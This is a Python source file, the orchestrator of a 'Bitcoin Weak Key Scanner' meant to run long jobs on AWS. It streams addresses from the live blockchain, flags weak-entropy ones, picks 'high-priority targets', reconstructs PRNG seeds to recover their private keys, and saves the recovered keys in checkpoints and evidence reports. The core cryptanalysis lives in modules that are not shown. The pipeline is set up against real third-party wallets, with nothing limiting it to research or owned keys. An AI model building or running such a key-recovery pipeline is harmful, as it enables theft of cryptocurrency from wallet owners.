"""
Main Orchestrator
=================

Complete pipeline orchestration for Bitcoin weak key scanning.
AWS-optimized with checkpointing, signal handling, and long-running execution support.

Pipeline Stages:
1. Address Collection from blockchain
2. Entropy Analysis for weakness detection
3. Pattern Detection for vulnerability fingerprinting
4. PRNG Reconstruction for key recovery
5. Validation and Evidence Generation

AWS Features:
- Automatic checkpointing every N addresses
- Resume from checkpoint on restart
- Graceful shutdown handling (SIGTERM, SIGINT)
- Memory-efficient streaming
- CloudWatch-compatible logging
"""

import os
import sys
import signal
import json
import yaml
import argparse
from typing import Dict, Optional
from datetime import datetime
import logging

# Local imports
from address_collector import AddressCollector
from entropy_analyzer import EntropyAnalyzer
from pattern_detector import PatternDetector
from prng_reconstructor import PRNGReconstructor
from key_recovery import KeyRecovery
from validator import Validator
from logger import ScanLogger


class CheckpointManager:
    """Manages checkpoint save/restore for long-running scans."""
    
    def __init__(self, checkpoint_file: str):
        self.checkpoint_file = checkpoint_file
        self.logger = logging.getLogger(__name__)
    
    def save_checkpoint(self, state: Dict):
        """Save current scan state to checkpoint file."""
        try:
            with open(self.checkpoint_file, 'w') as f:
                json.dump(state, f, indent=2)
            self.logger.info(f"Checkpoint saved: {self.checkpoint_file}")
        except Exception as e:
            self.logger.error(f"Failed to save checkpoint: {e}")
    
    def load_checkpoint(self) -> Optional[Dict]:
        """Load checkpoint if exists."""
        if os.path.exists(self.checkpoint_file):
            try:
                with open(self.checkpoint_file, 'r') as f:
                    state = json.load(f)
                self.logger.info(f"Checkpoint loaded: {self.checkpoint_file}")
                return state
            except Exception as e:
                self.logger.error(f"Failed to load checkpoint: {e}")
                return None
        return None
    
    def clear_checkpoint(self):
        """Remove checkpoint file."""
        if os.path.exists(self.checkpoint_file):
            os.remove(self.checkpoint_file)
            self.logger.info("Checkpoint cleared")


class WeakKeyScanner:
    """
    Main orchestrator for weak key scanning.
    
    Coordinates all pipeline components with AWS-optimized execution.
    """
    
    def __init__(self, config_path: str):
        """
        Initialize the scanner.
        
        Args:
            config_path: Path to configuration YAML file
        """
        # Load configuration
        with open(config_path, 'r') as f:
            self.config = yaml.safe_load(f)
        
        # Initialize components
        self.scan_logger = ScanLogger(self.config)
        self.logger = logging.getLogger(__name__)
        
        self.address_collector = AddressCollector(self.config)
        self.entropy_analyzer = EntropyAnalyzer(self.config)
        self.pattern_detector = PatternDetector(self.config)
        self.prng_reconstructor = PRNGReconstructor(self.config)
        self.validator = Validator(self.config)
        self.key_recovery = KeyRecovery(self.config, self.prng_reconstructor, self.validator)
        
        # Checkpoint management
        self.checkpoint_manager = CheckpointManager(self.config['output']['checkpoint_file'])
        
        # Scan state
        self.addresses_analyzed = []
        self.entropy_results = []
        self.patterns = {}
        self.recovered_keys = []
        self.interrupted = False
        
        # Signal handling for graceful shutdown
        self._setup_signal_handlers()
        
        self.logger.info("WeakKeyScanner initialized")
        self.logger.info(f"Mode: {self.config['prng_attack']['mode']}")
        self.logger.info(f"Network: {self.config['bitcoin_network']}")
    
    def _setup_signal_handlers(self):
        """Setup handlers for graceful shutdown on signals."""
        def shutdown_handler(signum, frame):
            self.logger.info(f"Received signal {signum}, initiating graceful shutdown...")
            self.interrupted = True
            self.save_checkpoint()
            sys.exit(0)
        
        signal.signal(signal.SIGTERM, shutdown_handler)
        signal.signal(signal.SIGINT, shutdown_handler)
    
    def save_checkpoint(self):
        """Save current scan state to checkpoint."""
        checkpoint_state = {
            'timestamp': datetime.now().isoformat(),
            'addresses_processed': len(self.addresses_analyzed),
            'weak_found': len([r for r in self.entropy_results if r.get('is_weak', False)]),
            'keys_recovered': len(self.recovered_keys),
            'addresses_analyzed': self.addresses_analyzed,
            'entropy_results': self.entropy_results,
            'patterns': self.patterns,
            'recovered_keys': self.recovered_keys
        }
        
        self.checkpoint_manager.save_checkpoint(checkpoint_state)
        self.scan_logger.log_checkpoint_saved(checkpoint_state)
    
    def load_checkpoint(self) -> bool:
        """
        Load and resume from checkpoint if available.
        
        Returns:
            True if checkpoint loaded, False otherwise
        """
        checkpoint = self.checkpoint_manager.load_checkpoint()
        
        if checkpoint:
            self.addresses_analyzed = checkpoint.get('addresses_analyzed', [])
            self.entropy_results = checkpoint.get('entropy_results', [])
            self.patterns = checkpoint.get('patterns', {})
            self.recovered_keys = checkpoint.get('recovered_keys', [])
            
            self.logger.info(f"Resumed from checkpoint: {len(self.addresses_analyzed)} addresses already processed")
            return True
        
        return False
    
    def collect_addresses(self, target_count: int) -> list:
        """
        Collect addresses from blockchain.
        
        Args:
            target_count: Number of addresses to collect
            
        Returns:
            List of address dictionaries
        """
        self.logger.info(f"Starting address collection: target={target_count}")
        
        addresses = []
        
        # Use streaming collection for memory efficiency
        for addr_data in self.address_collector.collect_addresses_stream(target_count):
            if self.interrupted:
                break
            
            addresses.append(addr_data)
            self.scan_logger.log_address_collected(addr_data['address'], addr_data)
            
            # Checkpoint periodically
            if len(addresses) % self.config['scanning']['checkpoint_interval'] == 0:
                self.save_checkpoint()
        
        self.logger.info(f"Address collection complete: {len(addresses)} addresses")
        
        return addresses
    
    def analyze_entropy(self, addresses: list) -> list:
        """
        Perform entropy analysis on collected addresses.
        
        Args:
            addresses: List of address dictionaries
            
        Returns:
            List of entropy analysis results
        """
        self.logger.info(f"Starting entropy analysis: {len(addresses)} addresses")
        
        results = []
        
        for i, addr_data in enumerate(addresses):
            if self.interrupted:
                break
            
            address = addr_data['address']
            result = self.entropy_analyzer.analyze_address(address)
            
            # Add metadata
            result.update({
                'block_height': addr_data.get('block_height'),
                'transaction': addr_data.get('transaction')
            })
            
            results.append(result)
            self.scan_logger.log_entropy_analysis(result)
            
            if (i + 1) % 100 == 0:
                self.logger.info(f"Entropy analysis progress: {i+1}/{len(addresses)}")
            
            # Checkpoint periodically
            if (i + 1) % self.config['scanning']['checkpoint_interval'] == 0:
                self.entropy_results = results
                self.save_checkpoint()
        
        self.logger.info(f"Entropy analysis complete: {len(results)} addresses analyzed")
        
        return results
    
    def detect_patterns(self, addresses: list, entropy_results: list) -> dict:
        """
        Detect weakness patterns.
        
        Args:
            addresses: List of address dictionaries
            entropy_results: List of entropy analysis results
            
        Returns:
            Dictionary of detected patterns
        """
        self.logger.info("Starting pattern detection")
        
        patterns = self.pattern_detector.detect_all_patterns(addresses, entropy_results)
        
        self.scan_logger.log_pattern_detection(patterns)
        
        self.logger.info(f"Pattern detection complete: {patterns.get('total_patterns', 0)} patterns found")
        
        return patterns
    
    def recover_keys(self, patterns: dict, entropy_results: list) -> list:
        """
        Attempt to recover private keys for weak addresses.
        
        Args:
            patterns: Detected patterns
            entropy_results: Entropy analysis results
            
        Returns:
            List of successful recovery results
        """
        self.logger.info("Starting key recovery phase")
        
        # Identify high-priority targets
        targets = self.pattern_detector.identify_high_priority_targets(patterns, entropy_results)
        
        self.logger.info(f"Identified {len(targets)} high-priority targets")
        
        if not targets:
            self.logger.info("No high-priority targets identified, skipping key recovery")
            return []
        
        # Attempt recovery
        recoveries = self.key_recovery.recover_batch(targets)
        
        # Log each recovery
        for recovery in recoveries:
            self.scan_logger.log_key_recovery_attempt(
                recovery['address'],
                True,
                {'seed': recovery['seed'], 'time': recovery['recovery_time_seconds']}
            )
        
        self.logger.info(f"Key recovery complete: {len(recoveries)} keys recovered")
        
        return recoveries
    
    def run_full_scan(self, num_addresses: Optional[int] = None):
        """
        Run complete scan pipeline.
        
        Args:
            num_addresses: Number of addresses to scan (None = use config)
        """
        start_time = datetime.now()
        
        if num_addresses is None:
            num_addresses = self.config['scanning']['num_addresses']
        
        self.logger.info("=" * 70)
        self.logger.info("BITCOIN WEAK KEY SCANNER - STARTING FULL SCAN")
        self.logger.info("=" * 70)
        self.logger.info(f"Target addresses: {num_addresses:,}")
        self.logger.info(f"Network: {self.config['bitcoin_network']}")
        self.logger.info(f"Mode: {self.config['prng_attack']['mode']}")
        
        # Log scan start
        self.scan_logger.log_scan_start(num_addresses, {
            'mode': self.config['prng_attack']['mode'],
            'seed_space': self.prng_reconstructor.seed_space,
            'parallel_workers': self.config['prng_attack']['parallel_workers']
        })
        
        # Check for checkpoint resume
        if self.config['scanning']['resume_from_checkpoint']:
            if self.load_checkpoint():
                self.logger.info("Resuming from checkpoint")
                num_addresses -= len(self.addresses_analyzed)
        
        try:
            # Stage 1: Collect Addresses
            self.logger.info("\n" + "=" * 70)
            self.logger.info("STAGE 1: ADDRESS COLLECTION")
            self.logger.info("=" * 70)
            
            new_addresses = self.collect_addresses(num_addresses)
            self.addresses_analyzed.extend(new_addresses)
            
            # Stage 2: Entropy Analysis
            self.logger.info("\n" + "=" * 70)
            self.logger.info("STAGE 2: ENTROPY ANALYSIS")
            self.logger.info("=" * 70)
            
            new_entropy_results = self.analyze_entropy(new_addresses)
            self.entropy_results.extend(new_entropy_results)
            
            weak_count = len([r for r in self.entropy_results if r.get('is_weak', False)])
            self.logger.info(f"Weak addresses identified: {weak_count}")
            
            # Stage 3: Pattern Detection
            self.logger.info("\n" + "=" * 70)
            self.logger.info("STAGE 3: PATTERN DETECTION")
            self.logger.info("=" * 70)
            
            self.patterns = self.detect_patterns(self.addresses_analyzed, self.entropy_results)
            
            # Stage 4: Key Recovery
            self.logger.info("\n" + "=" * 70)
            self.logger.info("STAGE 4: KEY RECOVERY")
            self.logger.info("=" * 70)
            
            new_recoveries = self.recover_keys(self.patterns, self.entropy_results)
            self.recovered_keys.extend(new_recoveries)
            
            # Stage 5: Generate Reports
            self.logger.info("\n" + "=" * 70)
            self.logger.info("STAGE 5: REPORT GENERATION")
            self.logger.info("=" * 70)
            
            self.generate_reports()
            
        except Exception as e:
            self.logger.error(f"Scan failed with exception: {e}", exc_info=True)
            self.scan_logger.log_error("scan_exception", str(e), {'stage': 'unknown'})
            self.save_checkpoint()
            raise
        
        finally:
            # Final checkpoint
            self.save_checkpoint()
        
        # Scan complete
        elapsed_time = (datetime.now() - start_time).total_seconds()
        
        self.logger.info("\n" + "=" * 70)
        self.logger.info("SCAN COMPLETE")
        self.logger.info("=" * 70)
        self.logger.info(f"Duration: {elapsed_time:.2f} seconds ({elapsed_time/60:.2f} minutes)")
        self.logger.info(f"Addresses analyzed: {len(self.addresses_analyzed):,}")
        self.logger.info(f"Weak addresses: {weak_count:,}")
        self.logger.info(f"Patterns detected: {self.patterns.get('total_patterns', 0):,}")
        self.logger.info(f"Keys recovered: {len(self.recovered_keys):,}")
    
    def generate_reports(self):
        """Generate all output reports."""
        self.logger.info("Generating reports...")
        
        # Collect statistics
        stats = {
            'scan_duration_seconds': (datetime.now() - self.scan_logger.scan_start_time).total_seconds(),
            'api_calls': self.address_collector.api_call_count,
            'recovery_stats': self.key_recovery.get_recovery_stats()
        }
        
        # Generate JSON evidence report
        evidence_path = self.scan_logger.generate_evidence_report(
            self.addresses_analyzed,
            self.entropy_results,
            self.patterns,
            self.recovered_keys,
            stats
        )
        
        # Generate human-readable summary
        weak_count = len([r for r in self.entropy_results if r.get('is_weak', False)])
        summary_path = self.scan_logger.generate_summary_report(
            len(self.addresses_analyzed),
            weak_count,
            self.patterns,
            len(self.recovered_keys),
            stats
        )
        
        self.logger.info(f"Reports generated:")
        self.logger.info(f"  Evidence: {evidence_path}")
        self.logger.info(f"  Summary:  {summary_path}")


def main():
    """Main entry point."""
    parser = argparse.ArgumentParser(
        description='Bitcoin Weak Key Scanner - Production AWS Implementation'
    )
    parser.add_argument(
        '--config',
        default='../config/config.yaml',
        help='Path to configuration file'
    )
    parser.add_argument(
        '--addresses',
        type=int,
        help='Number of addresses to scan (overrides config)'
    )
    parser.add_argument(
        '--no-checkpoint',
        action='store_true',
        help='Disable checkpoint resume'
    )
    parser.add_argument(
        '--clear-checkpoint',
        action='store_true',
        help='Clear existing checkpoint before starting'
    )
    
    args = parser.parse_args()
    
    # Initialize scanner
    scanner = WeakKeyScanner(args.config)
    
    # Clear checkpoint if requested
    if args.clear_checkpoint:
        scanner.checkpoint_manager.clear_checkpoint()
    
    # Disable checkpoint resume if requested
    if args.no_checkpoint:
        scanner.config['scanning']['resume_from_checkpoint'] = False
    
    # Run scan
    scanner.run_full_scan(args.addresses)


if __name__ == '__main__':
    main()
